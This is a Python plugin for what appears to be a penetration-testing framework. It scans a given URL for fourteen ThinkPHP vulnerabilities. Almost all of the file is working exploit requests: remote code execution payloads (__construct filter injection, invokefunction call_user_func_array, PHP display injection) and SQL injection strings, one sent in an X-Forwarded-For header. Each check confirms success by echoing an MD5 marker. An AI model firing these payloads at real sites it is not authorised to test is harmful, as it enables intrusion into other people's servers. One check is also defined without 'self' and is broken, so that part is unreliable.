from lib.Base_module import Base_module
import time
import urllib
import requests
import urllib3
import datetime
import re
from colorama import Fore
urllib3.disable_warnings()



class Thinkphpscan(Base_module):
    def __init__(self):
        options = [
            ['url', '/', '要扫描的url,包含http://或https://'],
        ]

        moudle_description = {
            'version': 'v1.0',
            'author': 'Gr33k',
            'completion_time': '2019.11.10',
            'name': 'thinkphp漏洞扫描工具',
        }
        super().__init__(moudle_description,options)
        self.version = moudle_description['version']
        self.author = moudle_description['author']
        self.completion_time = moudle_description['completion_time']
        self.name = moudle_description['name']
        self.options = super().return_options(options)
        self.variables = super().return_variables(options)

    def thinkphp_checkcode_time_sqli_verify(self):
        pocdict = {
            "vulnname": "thinkphp_checkcode_time_sqli",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": "TPscan",
            "DNT": "1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Content-Type": "multipart/form-data; boundary=--------641902708",
            "Accept-Encoding": "gzip, deflate, sdch",
            "Accept-Language": "zh-CN,zh;q=0.8",
        }
        payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--"
        try:
            start_time = time.time()
            vurl = urllib.parse.urljoin(self.variables['url'], 'index.php?s=/home/user/checkcode/')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
            if time.time() - start_time >= 8:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['payload'] = payload
                pocdict['proof'] = 'time sleep 8'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_checkcode_time_sqli]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_checkcode_time_sqli]漏洞' + Fore.RESET)

    def thinkphp_construct_code_exec_verify(self):
        pocdict = {
            "vulnname": "thinkphp_construct_code_exec",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": "TPscan",
        }
        payload = {
            '_method': '__construct',
            'filter[]': 'print_r',
            'method': 'get',
            'server[REQUEST_METHOD]': '56540676a129760a3',
        }
        try:
            vurl = urllib.parse.urljoin(self.variables['url'], 'index.php?s=captcha')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a3" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['payload'] = payload
                pocdict['proof'] = '56540676a129760a3'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_construct_code_exec]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_construct_code_exec]漏洞' + Fore.RESET)

    def thinkphp_construct_debug_rce_verify(self):
        pocdict = {
            "vulnname": "thinkphp_construct_debug_rce",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": "TPscan",
        }
        payload = {
            '_method': '__construct',
            'filter[]': 'print_r',
            'server[REQUEST_METHOD]': '56540676a129760a3',
        }
        cookies = {
            'Cookies':""
        }
        proxy = {
            'http':''
        }
        try:
            vurl = urllib.parse.urljoin(self.variables['url'], 'index.php')
            req = requests.post(vurl, data=payload, cookies=cookies, headers=headers, timeout=15, verify=False,
                                proxies=proxy)
            if r"56540676a129760a3" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['payload'] = payload
                pocdict['proof'] = '56540676a129760a3'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_construct_debug_rce]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_construct_debug_rce]漏洞' + Fore.RESET)

    def thinkphp_debug_index_ids_sqli_verify(url):
        pocdict = {
            "vulnname": "thinkphp_debug_index_ids_sqli",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": "TPscan",
        }
        payload = 'index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1'
        try:
            vurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_debug_index_ids_sqli]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_debug_index_ids_sqli]漏洞' + Fore.RESET)

    def thinkphp_driver_display_rce_verify(self):
        pocdict = {
            "vulnname": "thinkphp_driver_display_rce",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
        }
        try:
            vurl = urllib.parse.urljoin(self.variables['url'],
                                        'index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760a'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_driver_display_rce]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_driver_display_rce]漏洞' + Fore.RESET)

    def thinkphp_index_construct_rce_verify(self):
        pocdict = {
            "vulnname": "thinkphp_index_construct_rce",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
            "Content-Type": "application/x-www-form-urlencoded",
        }
        payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=print_r'
        try:
            vurl = urllib.parse.urljoin(self.variables['url'], 'index.php?s=index/index/index')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
            if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['payload'] = payload
                pocdict['proof'] = '4e5e5d7364f443e28fbf0d3ae744a59a'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_index_construct_rce]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_index_construct_rce]漏洞' + Fore.RESET)

    def thinkphp_index_showid_rce_verify(self):
        pocdict = {
            "vulnname": "thinkphp_index_showid_rce",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
        }
        try:
            vurl = urllib.parse.urljoin(self.variables['url'],
                                        'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~print_r(md5(2333))}]')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
            vurl2 = urllib.parse.urljoin(self.variables['url'], 'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log'.format(
                timenow))
            req2 = requests.get(vurl2, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a3" in req2.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760a3 found'
                pocdict['response'] = req2.text
                print('[+] 目标url存在[thinkphp_index_showid_rce]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_index_showid_rce]漏洞' + Fore.RESET)

    def thinkphp_invoke_func_code_exec_verify(self):
        pocdict = {
            "vulnname": "thinkphp_invoke_func_code_exec",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
        }
        controllers = list()
        req = requests.get(self.variables['url'], headers=headers, timeout=15, verify=False)
        pattern = '<a[\\s+]href="/[A-Za-z]+'
        matches = re.findall(pattern, req.text)
        for match in matches:
            controllers.append(match.split('/')[1])
        controllers.append('index')
        controllers = list(set(controllers))
        try:
            for controller in controllers:
                    payload = 'index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'.format(
                        controller)
                    vurl = urllib.parse.urljoin(self.variables['url'], payload)
                    req = requests.get(vurl, headers=headers, timeout=15, verify=False)
                    if r"56540676a129760a3" in req.text:
                        pocdict['isvul'] = True
                        pocdict['vulnurl'] = vurl
                        pocdict['proof'] = '56540676a129760a3'
                        pocdict['response'] = req.text
                        print('[+] 目标url存在[thinkphp_invoke_func_code_exec]漏洞')
                        print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_invoke_func_code_exec]漏洞' + Fore.RESET)


    def thinkphp_lite_code_exec_verify(self):
        pocdict = {
            "vulnname": "thinkphp_lite_code_exec",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
        }
        try:
            payload = 'index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D'
            vurl = urllib.parse.urljoin(self.variables['url'], payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a3" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760a3'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_lite_code_exec]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_lite_code_exec]漏洞' + Fore.RESET)

    def thinkphp_method_filter_code_exec_verify(self):
        pocdict = {
            "vulnname": "thinkphp_method_filter_code_exec",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
        }
        payload = {
            'c': 'print_r',
            'f': '4e5e5d7364f443e28fbf0d3ae744a59a',
            '_method': 'filter',
        }
        try:
            vurl = urllib.parse.urljoin(self.variables['url'], 'index.php')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
            if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['payload'] = payload
                pocdict['proof'] = '4e5e5d7364f443e28fbf0d3ae744a59a'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_method_filter_code_exec]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_method_filter_code_exec]漏洞' + Fore.RESET)

    def thinkphp_multi_sql_leak_verify(self):
        pocdict = {
            "vulnname": "thinkphp_multi_sql_leak",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
        }
        payloads = [
            r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
            r'index.php?s=/home/shopcart/getpriceNum/id/1%27',
            r'index.php?s=/home/user/cut/id/1%27',
            r'index.php?s=/home/service/index/id/1%27',
            r'index.php?s=/home/pay/chongzhi/orderid/1%27',
            r'index.php?s=/home/order/complete/id/1%27',
            r'index.php?s=/home/order/detail/id/1%27',
            r'index.php?s=/home/order/cancel/id/1%27',
        ]
        try:
            for payload in payloads:
                vurl = urllib.parse.urljoin(self.variables['url'], payload)
                req = requests.get(vurl, headers=headers, timeout=15, verify=False)
                if r"SQL syntax" in req.text:
                    pocdict['isvul'] = True
                    pocdict['vulnurl'] = vurl
                    pocdict['proof'] = 'SQL syntax found'
                    pocdict['response'] = req.text
                    print('[+] 目标url存在[thinkphp_multi_sql_leak]漏洞')
                    print(pocdict)
                    break
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_multi_sql_leak]漏洞' + Fore.RESET)

    def thinkphp_pay_orderid_sqli_verify(self):
        pocdict = {
            "vulnname": "thinkphp_pay_orderid_sqli",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
        }
        try:
            vurl = urllib.parse.urljoin(self.variables['url'],
                                        'index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760a'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_pay_orderid_sqli]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_pay_orderid_sqli]漏洞' + Fore.RESET)

    def thinkphp_request_input_rce_verify(self):
        pocdict = {
            "vulnname": "thinkphp_request_input_rce",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
        }
        try:
            vurl = urllib.parse.urljoin(self.variables['url'],
                                        'index.php?s=index/\\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760a'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_request_input_rce]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_request_input_rce]漏洞' + Fore.RESET)

    def thinkphp_view_recent_xff_sqli_verify(self):
        pocdict = {
            "vulnname": "thinkphp_view_recent_xff_sqli",
            "isvul": False,
            "vulnurl": "",
            "payload": "",
            "proof": "",
            "response": "",
            "exception": "",
        }
        headers = {
            "User-Agent": 'TPscan',
            "X-Forwarded-For": "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
        }
        try:
            vurl = urllib.parse.urljoin(self.variables['url'], 'index.php?s=/home/article/view_recent/name/1')
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760a'
                pocdict['response'] = req.text
                print('[+] 目标url存在[thinkphp_view_recent_xff_sqli]漏洞')
                print(pocdict)
        except:
            print(Fore.RED + '[-] 目标url不存在[thinkphp_view_recent_xff_sqli]漏洞' + Fore.RESET)



    def start(self):
        if self.variables['url'] == '/':
            pass
        else:
            self.thinkphp_checkcode_time_sqli_verify()
            self.thinkphp_construct_code_exec_verify()
            self.thinkphp_construct_debug_rce_verify()
            self.thinkphp_debug_index_ids_sqli_verify()
            self.thinkphp_driver_display_rce_verify()
            self.thinkphp_index_construct_rce_verify()
            self.thinkphp_index_showid_rce_verify()
            self.thinkphp_invoke_func_code_exec_verify()
            self.thinkphp_lite_code_exec_verify()
            self.thinkphp_method_filter_code_exec_verify()
            self.thinkphp_multi_sql_leak_verify()
            self.thinkphp_pay_orderid_sqli_verify()
            self.thinkphp_request_input_rce_verify()
            self.thinkphp_view_recent_xff_sqli_verify()

